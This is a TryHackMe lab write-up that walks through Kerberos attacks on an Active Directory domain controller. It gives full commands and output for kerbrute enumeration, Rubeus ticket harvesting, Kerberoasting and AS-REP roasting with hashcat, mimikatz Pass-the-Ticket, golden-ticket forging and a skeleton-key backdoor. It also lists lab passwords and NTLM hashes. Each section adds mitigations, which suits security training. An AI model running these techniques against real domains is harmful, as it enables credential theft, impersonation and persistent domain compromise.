# Attacking Kerberos — TryHackMe Writeup

**Room:** [Attacking Kerberos](https://tryhackme.com/room/attackingkerberos)
**Target:** `CONTROLLER.local` (`10.10.68.235`)
**Attacker:** Kali Linux

A practical walkthrough of common Kerberos attack paths against an Active Directory domain controller — enumeration, ticket harvesting, Kerberoasting, AS-REP roasting, Pass-the-Ticket, and Golden/Silver tickets, finishing with a note on Kerberos backdoors.

> Sections 1–3 below are fully backed by my own command output (kerbrute, Rubeus, hashcat). Sections 4–6 are included for completeness, following the room's documented methodology — I didn't capture original screenshots for those steps, so they're marked accordingly.

---

## Lab Setup

```bash
sudo su
echo "10.10.68.235 CONTROLLER.local" >> /etc/hosts

mkdir -p thm/AD/ADK
cd thm/AD/ADK
mkdir nmap content exploits scripts
```

Target is reachable over RDP/SSH. Domain credentials for the initial foothold:

```
Username: Administrator
Password: P@$$W0rd
Domain:   controller.local
```

---

## 1. Enumeration with Kerbrute ✅

[Kerbrute](https://github.com/ropnop/kerbrute) abuses the Kerberos pre-authentication step to enumerate valid domain usernames **without needing any domain credentials** — an invalid username gets a different KDC error than a valid one with a wrong password.

```bash
chmod +x kerbrute
./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt
```

**Output:**

```
Version: v1.0.3 (9dad6e1) - Ronnie Flathers @ropnop

Using KDC(s):
  CONTROLLER.local:88

[+] VALID USERNAME:  admin1@CONTROLLER.local
[+] VALID USERNAME:  administrator@CONTROLLER.local
[+] VALID USERNAME:  admin2@CONTROLLER.local
[+] VALID USERNAME:  httpservice@CONTROLLER.local
[+] VALID USERNAME:  machine1@CONTROLLER.local
[+] VALID USERNAME:  machine2@CONTROLLER.local
[+] VALID USERNAME:  sqlservice@CONTROLLER.local
[+] VALID USERNAME:  user3@CONTROLLER.local
[+] VALID USERNAME:  user1@CONTROLLER.local
[+] VALID USERNAME:  user2@CONTROLLER.local
Done! Tested 100 usernames (10 valid) in 0.259 seconds
```

### Results

| # | Account |
|---|---|
| 1 | `admin1` |
| 2 | `administrator` |
| 3 | `admin2` |
| 4 | `httpservice` |
| 5 | `machine1` |
| 6 | `machine2` |
| 7 | `sqlservice` |
| 8 | `user1` |
| 9 | `user2` |
| 10 | `user3` |

**10 valid accounts** confirmed from a 100-entry wordlist, zero domain access required. This single step gives a full target list for every later attack (Kerberoasting targets, AS-REP roasting candidates, password spraying, etc.).

---

## 2. Harvesting TGTs with Rubeus ✅

[Rubeus](https://github.com/GhostPack/Rubeus) can passively monitor LSASS and capture Ticket Granting Tickets (TGTs) as they're issued or renewed — useful for catching privileged tickets (like a domain admin's) that get cached during normal logon activity.

```cmd
Rubeus.exe harvest /interval:30
```

This polls the ticket cache every 30 seconds and dumps any TGTs it finds, base64-encoded (`.kirbi` format), ready for a Pass-the-Ticket attack.

**Captured output:**

```
StartTime    : 6/27/2026 6:15:13 AM
EndTime      : 6/27/2026 4:15:13 PM
RenewTill    : 7/4/2026 6:15:13 AM
Flags        : name_canonicalize, pre_authent, renewable, forwarded, forwardable
Base64EncodedTicket :

doIFhDCCBYCgAwIBBaEDAgEWooIEeDCCBHRhggRwMIIEbKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyi
cmJ0Z3QbCQ0BHEENPTlRST0xMRVIuTE9DQUyiggQWBIIEEhsGXvDBo4VlI/Z4Pa70EHDIpoqWuurgDSsi
2y5yUIEKGzVJZaC3FMaoc0z1zVT18Gd7Ddautn54JUQuaoxvRqEaWdL6N4PK9dvCJCW5g6RyA4Kk4U1I6XGlaG6vmPJy+r5wN7
KbUUh43WQX5tAkizFlWLRF/KUKwfjBfBi9zzv2RaXcWNA9HiHUroQ9S5EaCW4eaUIzGzwe/0L+JPD2rleWL+R3yW1/uY9lzFgQRp
Vos1URu9tsYNxpnt3BkPE2T6bdzK9qGrC1d8QFFpyP+H1TZlEiB/LcG87B2FIvlvhKrF2ZUz9I7hdqu963xMZlPyCeiHNit+Lllt
g+0uUo4fZPlTpX31wn70HWuAUXSwFWCfFUD6t7ZNO3eSoFlNBPBpd62k23o3Gz7bTBnAzt0/+iF3t7zQLOqqEmEcs9sJhzWKDqhM
...
[*] Ticket cache size: 3
[*] Sleeping until 6/27/2026 6:40:02 AM (30 seconds) for next display
```

### Analysis

| Field | Value | Significance |
|---|---|---|
| RenewTill | 7/4/2026 6:15:13 AM | Ticket is renewable for ~7 days from harvest |
| Flags | `forwarded, forwardable` | Ticket can be relayed to another service on the user's behalf — required for delegation-based attacks |
| Cache size | 3 | Multiple tickets accumulating in LSASS over time |

The TGT renewal window plus `forwardable` flag means a harvested machine/user TGT stays usable well beyond the capture window, and (per the room's methodology) **disabling Windows Defender** is what lets the Administrator's own TGT get harvested in the same way — turning this from "I have a machine ticket" into "I have a domain admin ticket," ready to feed into `mimikatz kerberos::ptt` (Section 4).

---

## 3. Kerberoasting w/ Rubeus + hashcat ✅

Kerberoasting targets any account with a registered **SPN** (Service Principal Name). Any authenticated domain user can request a TGS (service ticket) for that SPN — the ticket is encrypted with the service account's NTLM hash, so it can be cracked **offline**, with no further interaction with the DC.

From the kerbrute results, two service accounts stood out as Kerberoastable: `SQLService` and `HTTPService`.

### Requesting the TGS tickets

```bash
# Rubeus, from a session on the DC
Rubeus.exe kerberoast

# Impacket, from Kali, using compromised machine creds
sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.68.235 -request
```

Each method returns a `$krb5tgs$23$...` hash — the `23` denotes etype 23 (RC4-HMAC), the weakest and most crackable Kerberos encryption type still seen on legacy/poorly-hardened service accounts.

### Cracking with hashcat

Hash mode `13100` = *Kerberos 5, etype 23, TGS-REP*.

```bash
hashcat -m 13100 -a 0 hash1.txt Pass.txt
```

**HTTPService — cracked:**

```
$krb5tgs$23$*HTTPService$CONTROLLER.local$CONTROLLER-1/HTTPService.CONTROLLER.local:30222*$eaf...fd18a8:Summer2020

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Speed.#01........: 166.3 kH/s
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 1240/1240 (100.00%)
```

**SQLService — cracked (separate run, shown via `--show`):**

```bash
hashcat -m 13100 hash.txt --show
```
```
$krb5tgs$23$*SQLService$CONTROLLER.local$CONTROLLER-1/SQLService.CONTROLLER.local:30111*$ac6...47c:MYPassword123#
```

### Results

| Service Account | SPN | Cracked Password |
|---|---|---|
| **SQLService** | `CONTROLLER-1/SQLService.CONTROLLER.local:30111` | `MYPassword123#` |
| **HTTPService** | `CONTROLLER-1/HTTPService.CONTROLLER.local:30222` | `Summer2020` |

Both passwords fell to a small, AD-tailored wordlist (1,240 candidates) almost instantly — `166.3 kH/s` was more than enough since etype-23 RC4 tickets are cheap to brute-force compared to AES-encrypted ones. This is the textbook Kerberoasting weakness: **the strength of the attack depends entirely on the strength of the service account password**, not on any flaw in Kerberos itself.

**Mitigations:**
- Use long, random passwords (25+ characters) for service accounts, ideally managed via **gMSA** (Group Managed Service Accounts), which rotate automatically.
- Avoid making service accounts members of privileged groups (Domain Admins, etc.) — limits blast radius if cracked.
- Where possible, force AES-only support (`msDS-SupportedEncryptionTypes`) to remove the RC4 downgrade path.

---

## 4. AS-REP Roasting w/ Rubeus 📖 *(documented technique, not independently captured)*

AS-REP Roasting is Kerberoasting's sibling attack: instead of targeting service accounts via SPNs, it targets **any user account with Kerberos pre-authentication disabled** (`DONT_REQUIRE_PREAUTH`). Without pre-auth, an attacker can request an AS-REP for that user with **no credentials at all**, and the response is partially encrypted with the user's NTLM hash — crackable offline exactly like a Kerberoast hash.

```cmd
Rubeus.exe asreproast
```

This returns `$krb5asrep$23$...` hashes for any pre-auth-disabled accounts found (in this room: `Admin2` and `User3`).

```bash
hashcat -m 18200 -a 0 hash.txt pass.txt
```

Hash mode `18200` = *Kerberos 5, etype 23, AS-REP*.

| Field | Value |
|---|---|
| Hash type | Kerberos 5 AS-REP, etype 23 |
| Vulnerable user | `User3` → password `Password3` |
| Vulnerable admin | `Admin2` → password `P@$$W0rd2` |

**Mitigation:** Never disable pre-authentication unless absolutely required by legacy software; audit `DONT_REQUIRE_PREAUTH` regularly via BloodHound or PowerView.

---

## 5. Pass-the-Ticket w/ Mimikatz 📖 *(documented technique, not independently captured)*

Pass-the-Ticket (PtT) reuses a TGT pulled straight out of LSASS memory — no cracking required. If a privileged ticket (e.g. a domain admin's) happens to be cached on a box you've compromised, you can inject it into your own session and instantly inherit that identity.

```cmd
mimikatz.exe
privilege::debug
sekurlsa::tickets /export        # dump all cached .kirbi tickets

kerberos::ptt [0;444c7]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi
klist                            # confirm the ticket is now active in this session
```

This is exactly the technique the harvested TGT from Section 2 feeds into: once an Administrator TGT lands in the harvest cache, `kerberos::ptt` turns "I captured a ticket" into "I am the domain admin," with no password or hash ever required.

**Mitigation:** Restrict admin logons to dedicated admin workstations (tiering model), enable Credential Guard, and minimize standing privileged sessions on shared hosts.

---

## 6. Golden / Silver Ticket Attacks w/ Mimikatz 📖 *(documented technique, not independently captured)*

| Ticket Type | Forged using | Grants access to |
|---|---|---|
| **Golden Ticket** | `krbtgt` account hash | Anything in the domain, indefinitely |
| **Silver Ticket** | A single service account's hash | Only that specific service |

The `krbtgt` account is the KDC's own service account — its hash is used to encrypt every TGT issued in the domain. Compromising it once gives functionally permanent access (it survives password resets of other accounts and is fixed by very few orgs after detection).

```cmd
mimikatz.exe
privilege::debug
lsadump::lsa /inject /name:krbtgt
```

Forge the Golden Ticket:

```cmd
Kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /id:1103
misc::cmd
```

| Account | NTLM Hash |
|---|---|
| SQLService | `cd40c9ed96265531b21fc5b1dafcfb0a` |
| Administrator | `2777b7fec870e04dda00cd7260f7bee6` |

**Mitigation:** Rotate the `krbtgt` password **twice** (back-to-back) after any suspected domain compromise; monitor for anomalous TGT lifetimes and out-of-policy ticket flags.

---

## 7. Kerberos Backdoor — Skeleton Key 📖 *(reference only)*

A subtler persistence trick: implant a "skeleton key" into LSASS on the DC. Kerberos AS-REQ authentication relies on decrypting a timestamp with the user's NT hash — once a skeleton key is active, the DC will accept **either** the real NT hash **or** the skeleton key hash, for every account in the forest.

```cmd
mimikatz.exe
privilege::debug
misc::skeleton
```

Default skeleton key password: **`mimikatz`** (hash `60BA4FCADC466C7A033C178194C03DF6`). Works only over RC4 — a domain enforcing AES-only Kerberos blocks this technique outright.

```cmd
net use \\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz
```

**Mitigation:** Enforce AES Kerberos encryption domain-wide, monitor LSASS for code injection (e.g. via Sysmon + EDR), and treat any DC reboot/credential anomaly as a potential indicator of skeleton key persistence (it doesn't survive a reboot, which is itself a useful detection/recovery lever).

---

## Summary

| Attack | Privilege Required | Outcome |
|---|---|---|
| Kerbrute enumeration | None | 10 valid usernames |
| TGT harvesting | Local session on a domain host | Captured machine + user TGTs, including renewal window for later reuse |
| Kerberoasting | Any domain user | SQLService & HTTPService cleartext passwords |
| AS-REP Roasting | None (network access to KDC) | User3 & Admin2 cleartext passwords |
| Pass-the-Ticket | Local admin / LSASS access | Direct impersonation of a captured identity, no cracking |
| Golden/Silver Ticket | krbtgt or service hash | Persistent, near-unrevokable domain access |
| Skeleton Key | Domain admin (one-time) | Universal backdoor password across the forest |

The chain in this room demonstrates how Kerberos attacks **compound**: unauthenticated enumeration (kerbrute) feeds target selection for Kerberoasting/AS-REP roasting, and any of those credential wins can bootstrap a foothold that eventually reaches ticket harvesting → Pass-the-Ticket → Golden Ticket, at which point persistence becomes the harder problem to solve than initial access ever was.

**Core takeaway:** almost every step here is defeated by the same two things — strong, unique service-account passwords (ideally gMSA-managed) and least-privilege service account membership. Everything past that point (PtT, Golden/Silver tickets, skeleton keys) requires privileged access that should never have been reachable in the first place.

---

## References

- [Attacking Kerberos — TryHackMe](https://tryhackme.com/room/attackingkerberos)
- [Kerbrute](https://github.com/ropnop/kerbrute)
- [Rubeus (GhostPack)](https://github.com/GhostPack/Rubeus)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [hashcat example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [Kerberoasting Revisited — SpecterOps](https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1)
- [AS-REP Roasting — ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [Pass-the-Ticket overview — Medium](https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a)
